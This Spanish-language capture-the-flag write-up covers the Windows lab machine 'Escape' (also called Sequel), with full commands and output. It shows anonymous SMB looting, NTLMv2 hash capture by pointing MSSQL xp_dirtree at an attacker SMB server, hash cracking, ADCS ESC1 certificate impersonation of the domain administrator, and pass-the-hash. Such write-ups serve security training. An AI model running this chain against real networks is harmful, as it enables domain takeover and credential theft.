# Escape

![](../../../../~gitbook/image.md)Publicado: 24 de Junio de 2025
Autor: José Miguel Romero aKa x3m1Sec
Dificultad: ⭐ Medium
OS: Windows
###📝 Descripción
Sequel es una máquina Windows de dificultad media que simula un entorno empresarial con Active Directory Certificate Services (ADCS). La explotación comienza con el acceso a recursos SMB públicos que contienen documentación sobre procedimientos de acceso a SQL Server. A través de estas credenciales iniciales, se realiza un ataque de captura de hash NTLMv2 mediante el abuso de la función `xp_dirtree` en MSSQL. Una vez obtenidas las credenciales del usuario `sql_svc`, se accede al sistema via WinRM y se descubren credenciales adicionales en logs del servidor SQL. Finalmente, se explota una vulnerabilidad ESC1 en ADCS para obtener un certificado digital que permite suplantar al administrador del dominio y comprometer completamente el sistema.
###📊 Resumen de la Explotación

####🔗 Cadena de Ataque

###🎯 Puntos Clave
- Enumeración SMB: Acceso a recursos públicos con credenciales anónimas
- Análisis de documentación: Extracción de credenciales de manuales corporativos
- MSSQL Enumeration: Uso de `xp_dirtree` para captura de hash NTLMv2
- Cracking de hashes: Obtención de credenciales mediante diccionario
- Log Analysis: Búsqueda de credenciales en archivos de log del sistema
- ADCS ESC1: Explotación de plantillas de certificados vulnerables
- Certificate Impersonation: Suplantación de identidad mediante certificados digitales

###🔭 Reconocimiento

####🏓 Ping para verificación en base a TTL
💡 Nota: El TTL cercano a 128 sugiere que probablemente sea una máquina Windows.
####🚀 Escaneo de puertos

####🔍 Enumeración de servicios
⚠️ Añadimos el siguiente vhost a nuestro fichero /etc/hosts:
####📋 Análisis de Servicios Detectados
PuertoServicioDescripción53DNSServicio DNS del dominio88KerberosAutenticación del dominio135MSRPCLlamadas a procedimientos remotos139/445SMB/NetBIOSRecursos compartidos389/636LDAP/LDAPSDirectorio activo1433MSSQLBase de datos SQL Server5985WinRMAdministración remota de Windows🔥 Servicios críticos identificados:- SMB (445): Posible acceso a recursos compartidos
- MSSQL (1433): Base de datos con potencial información sensible
- WinRM (5985): Vector de acceso remoto
- LDAP (389/636): Enumeración de usuarios del dominio

###🌐 Enumeración de Servicios

####🗂️ SMB (Puerto 445) - Acceso Inicial
Ya que no disponemos de credenciales, comenzamos tratando de enumerar posibles recursos mediante una sesión nula:🎯 Recursos compartidos identificados:- Public → Acceso de lectura disponible ✅
- IPC$ → Acceso de lectura para enumeración ✅
- ADMIN$, C$, NETLOGON, SYSVOL → Sin acceso ❌
🔍 Enumeración del recurso Public📄 Contenido del archivo "SQL Server Procedures":![](../../../../~gitbook/image.md)🔍 Información extraída del documento:- Debido a incidentes de seguridad previos con servidores SQL
- Tom implementó procedimientos de acceso para testing en servidor clonado
- Usuario de prueba: `PublicUser`
- Contraseña: `GuestUserCantWrite1`
- Método de autenticación: SQL Server Authentication (no Windows Auth)
- Instancia temporal en el controlador de dominio (será eliminada)
🔑 Primera credencial obtenida: `PublicUser:GuestUserCantWrite1`
####🗄️ MSSQL (Puerto 1433) - Escalada de Privilegios
Verificamos las credenciales encontradas en el documento PDF contra el servicio MSSQL:![](../../../../~gitbook/image.md)- SQL Server Authentication utilizada (sin `-windows-auth`)
- Conexión exitosa al servidor SQL
🔧 Enumeración de privilegios y capacidades![](../../../../~gitbook/image.md)⚠️ Limitaciones identificadas:- Usuario no tiene privilegios de `sysadmin`
- No puede habilitar `xp_cmdshell` para ejecución de comandos
- Acceso limitado a funciones administrativas
🎯 Ataque de Captura de Hash NTLMv2 - xp_dirtreeConfiguramos un servidor SMB malicioso para capturar hashes:Forzamos la autenticación del servicio SQL contra nuestro servidor:🎉 Hash NTLMv2 capturado:🔓 Cracking del Hash![](../../../../~gitbook/image.md)🔑 Segunda credencial obtenida: `sql_svc:REGGIE1234ronnie`
###🚀 Acceso Inicial

####🔐 Acceso WinRM como sql_svc

####👥 Enumeración de usuarios del sistema
🎯 Usuarios identificados:- Administrator → Objetivo principal
- Ryan.Cooper → Usuario potencial (sin acceso actual)
- sql_svc → Usuario actual

###🕵️ Enumeración del Sistema

####📂 Búsqueda de información sensible

####🔍 Análisis de logs de SQL Server
🚨 Información crítica encontrada en los logs:💡 Análisis de los logs:- Usuario `Ryan.Cooper` intentó autenticarse
- La contraseña `NuclearMosquito3` fue enviada como nombre de usuario por error
- Típico error humano durante el proceso de login
🔑 Tercera credencial obtenida: `Ryan.Cooper:NuclearMosquito3`
###🔄 Movimiento Lateral

####🎯 Acceso como Ryan.Cooper

####🏆 Primera Flag - User.txt

####🔍 Análisis de membresías de grupo
🎯 Grupos críticos identificados:![](../../../../~gitbook/image.md)GrupoDescripciónImpactoBUILTIN\Certificate Service DCOM AccessAcceso a servicios de certificadosAlto - Potencial ESC1-ESC8BUILTIN\Remote Management UsersAcceso WinRMMedio - Ya explotadoSEQUEL\Domain UsersUsuarios del dominioBajo - Acceso estándar🚨 ¡Grupo crítico detectado! → `Certificate Service DCOM Access` sugiere presencia de Active Directory Certificate Services (ADCS)
###💥 Escalada de Privilegios - ADCS ESC1

####🔍 Enumeración de ADCS
📋 Autoridad Certificadora identificada:- CA Name: `sequel-DC-CA`
- DNS Name: `dc.sequel.htb`
- Status: Activa y funcional
🎯 Plantilla vulnerable encontrada:
####🧨 ¿Qué es la vulnerabilidad ESC1?
ESC1 es una vulnerabilidad crítica de configuración en ADCS que permite la suplantación de identidad:🔴 Condiciones requeridas:- ✅ Enrollee Supplies Subject: El solicitante puede definir el subject del certificado
- ✅ Client Authentication: El certificado permite autenticación de usuarios
- ✅ Usuario tiene permisos de enrollment: Puede solicitar certificados
🎯 Impacto:- Suplantación de cualquier usuario del dominio
- Escalada de privilegios sin conocer contraseñas
- Compromiso total del dominio

####🎫 Explotación - Solicitud de certificado malicioso
📋 Parámetros del ataque:ParámetroValorDescripción`-u``ryan.cooper@sequel.htb`Usuario autenticado legítimo`-ca``sequel-DC-CA`Autoridad certificadora objetivo`-template``UserAuthentication`Plantilla vulnerable ESC1`-upn``administrator@sequel.htb`Identidad suplantada`-pfx``administrator.pfx`Certificado malicioso generado
####🎟️ Autenticación con certificado malicioso
🎉 ¡Hash del administrador obtenido!
###👑 Compromiso Total del Sistema

####🚀 Pass-the-Hash Attack

####🏆 Flag Final - Root.txt

####🛠️ Herramientas Utilizadas
HerramientaPropósitoFasenmapPort scanning y service enumerationReconocimientosmbclientEnumeración de recursos SMBEnumeraciónimpacket-mssqlclientConexión a SQL ServerAcceso Inicialimpacket-smbserverCaptura de hash NTLMv2EscaladahashcatCracking de hashesEscaladaevil-winrmAcceso remoto WindowsAcceso/Lateralcertipy-adExplotación ADCS ESC1Escalada FinalLast updated 9 months ago- [📝 Descripción](#descripcion)
- [📊 Resumen de la Explotación](#resumen-de-la-explotacion)
- [🎯 Puntos Clave](#puntos-clave)
- [🔭 Reconocimiento](#reconocimiento)
- [🌐 Enumeración de Servicios](#enumeracion-de-servicios-1)
- [🚀 Acceso Inicial](#acceso-inicial)
- [🕵️ Enumeración del Sistema](#enumeracion-del-sistema)
- [🔄 Movimiento Lateral](#movimiento-lateral)
- [💥 Escalada de Privilegios - ADCS ESC1](#escalada-de-privilegios-adcs-esc1)
- [👑 Compromiso Total del Sistema](#compromiso-total-del-sistema)

```
❯ ping -c2 10.10.11.202
PING 10.10.11.202 (10.10.11.202) 56(84) bytes of data.
64 bytes from 10.10.11.202: icmp_seq=1 ttl=127 time=46.0 ms
64 bytes from 10.10.11.202: icmp_seq=2 ttl=127 time=43.4 ms

--- 10.10.11.202 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1001ms
rtt min/avg/max/mdev = 43.375/44.712/46.049/1.337 ms
```

```
ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.202 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
```

```
echo $ports
53,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,49667,49689,49690,49708,55333
```

```
nmap -sC -sV -p$ports 10.10.11.202 -oN services.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-24 19:05 CEST
Nmap scan report for 10.10.11.202
Host is up (0.042s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-25 01:05:14Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
|_ssl-date: 2025-06-25T01:06:44+00:00; +8h00m01s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
|_ssl-date: 2025-06-25T01:06:44+00:00; +8h00m01s from scanner time.
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-06-25T01:01:38
|_Not valid after:  2055-06-25T01:01:38
| ms-sql-ntlm-info:
|   10.10.11.202:1433:
|     Target_Name: sequel
|     NetBIOS_Domain_Name: sequel
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: dc.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
| ms-sql-info:
|   10.10.11.202:1433:
|     Version:
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2025-06-25T01:06:44+00:00; +8h00m01s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
|_ssl-date: 2025-06-25T01:06:44+00:00; +8h00m01s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-25T01:06:44+00:00; +8h00m01s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         Microsoft Windows RPC
49708/tcp open  msrpc         Microsoft Windows RPC
55333/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2025-06-25T01:06:06
|_  start_date: N/A
|_clock-skew: mean: 8h00m00s, deviation: 0s, median: 8h00m00s
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
```

```
echo "10.10.11.202 sequel.htb" | sudo tee -a /etc/hosts
```

```
smbclient -N -L //10.10.11.202

Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
NETLOGON        Disk      Logon server share
Public          Disk
SYSVOL          Disk      Logon server share
```

```
netexec smb 10.10.11.202 -u 'anonymous' -p '' --shares
SMB         10.10.11.202    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.202    445    DC               [+] sequel.htb\anonymous: (Guest)
SMB         10.10.11.202    445    DC               [*] Enumerated shares
SMB         10.10.11.202    445    DC               Share           Permissions     Remark
SMB         10.10.11.202    445    DC               -----           -----------     ------
SMB         10.10.11.202    445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.202    445    DC               C$                              Default share
SMB         10.10.11.202    445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.202    445    DC               NETLOGON                        Logon server share
SMB         10.10.11.202    445    DC               Public          READ
SMB         10.10.11.202    445    DC               SYSVOL                          Logon server share
```

```
smbclient -N \\\\10.10.11.202\\Public
Try "help" to get a list of possible commands.
smb: \> dir
.                                   D        0  Sat Nov 19 12:51:25 2022
..                                  D        0  Sat Nov 19 12:51:25 2022
SQL Server Procedures.pdf           A    49551  Fri Nov 18 14:39:43 2022

5184255 blocks of size 4096. 1439394 blocks available
smb: \> get "SQL Server Procedures.pdf"
getting file \SQL Server Procedures.pdf of size 49551 as SQL Server Procedures.pdf (279.7 KiloBytes/sec) (average 279.7 KiloBytes/sec)
```

```
impacket-mssqlclient PublicUser:GuestUserCantWrite1@sequel.htb
```

```
SQL (PublicUser  guest@master)> SELECT SYSTEM_USER;
SQL (PublicUser  guest@master)> SELECT USER_NAME();
SQL (PublicUser  guest@master)> SELECT IS_SRVROLEMEMBER('sysadmin');
```

```
SQL (PublicUser  guest@master)> SELECT SYSTEM_USER;
----------
PublicUser

SQL (PublicUser  guest@master)> SELECT USER_NAME();
-----
guest

SQL (PublicUser  guest@master)> SELECT IS_SRVROLEMEMBER('sysadmin');
-
0
```

```
impacket-smbserver smbShare $(pwd) -smb2support
```

```
SQL (PublicUser  guest@master)> EXEC MASTER.sys.xp_dirtree '\\10.10.14.4\smbShare\test'
```

```
[*] AUTHENTICATE_MESSAGE (sequel\sql_svc,DC)
sql_svc::sequel:aaaaaaaaaaaaaaaa:1055af4d281c8d6617b054ecd21411d0:010100000000000080d924132ee5db01305f05d01e34bb350000000001001000580045004e004500760069007400470003001000580045004e00450076006900740047000200100069006d006c00700061004d006d0076000400100069006d006c00700061004d006d0076000700080080d924132ee5db0106000400020000000800300030000000000000000000000000300000dc5bb9e8723fbd567fc9f36f896d55bbc3522f69fb240fc4acceeb03faa19c760a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e0034000000000000000000
```

```
hashcat -m 5600 -a 0 sql_svc_hash /usr/share/wordlists/rockyou.txt
```

```
evil-winrm -i 10.10.11.202 -u sql_svc -p 'REGGIE1234ronnie'
```

```
*Evil-WinRM* PS C:\Users\sql_svc\Documents> whoami
sequel\sql_svc

*Evil-WinRM* PS C:\Users\sql_svc\Documents> net user sql_svc
User name                    sql_svc
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never
Password last set            11/18/2022 2:13:13 PM
Password expires             Never
Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   6/24/2025 6:41:49 PM
Logon hours allowed          All
Local Group Memberships      *Remote Management Use
Global Group memberships     *Domain Users
```

```
*Evil-WinRM* PS C:\Users> dir

Directory: C:\Users

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         2/7/2023   8:58 AM                Administrator
d-r---        7/20/2021  12:23 PM                Public
d-----         2/1/2023   6:37 PM                Ryan.Cooper
d-----         2/7/2023   8:10 AM                sql_svc
```

```
*Evil-WinRM* PS C:\> dir -Hidden -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password|credential|key"
```

```
*Evil-WinRM* PS C:\SQLServer\Logs> dir

Directory: C:\SQLServer\Logs

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         2/7/2023   8:06 AM          27608 ERRORLOG.BAK
```

```
*Evil-WinRM* PS C:\SQLServer\Logs> type ERRORLOG.BAK | Select-String -Pattern "password|login|fail"
```

```
2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
```

```
evil-winrm -i 10.10.11.202 -u ryan.cooper -p 'NuclearMosquito3'
```

```
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop> type user.txt
[REDACTED]
```

```
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> whoami
sequel\ryan.cooper

*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> whoami /groups
```

```
certipy-ad find -u 'ryan.cooper' -p 'NuclearMosquito3' -dc-ip 10.10.11.202 -vulnerable -stdout
```

```
Template Name                       : UserAuthentication
Display Name                        : UserAuthentication
Certificate Authorities             : sequel-DC-CA
Enabled                             : True
Client Authentication               : True
Enrollee Supplies Subject           : True  ⚠️ VULNERABLE
Certificate Name Flag               : EnrolleeSuppliesSubject
Extended Key Usage                  : Client Authentication
[!] Vulnerabilities
ESC1                              : Enrollee supplies subject and template allows client authentication.
```

```
certipy-ad req -u ryan.cooper@sequel.htb -p 'NuclearMosquito3' \
-ca 'sequel-DC-CA' -template UserAuthentication \
-upn administrator@sequel.htb \
-dc-ip 10.10.11.202 -pfx administrator.pfx
```

```
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 16
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@sequel.htb'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

```
# Sincronización de tiempo crítica para Kerberos
sudo rdate -n 10.10.11.202

# Autenticación con el certificado malicioso
certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.202
```

```
Wed Jun 25 16:47:23 CEST 2025
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@sequel.htb'
[*] Using principal: 'administrator@sequel.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:[REDACTED]
```

```
evil-winrm -i 10.10.11.202 -u Administrator -H '[REDACTED]'
```

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
sequel\administrator

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami /priv
```

```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
[REDACTED]
```
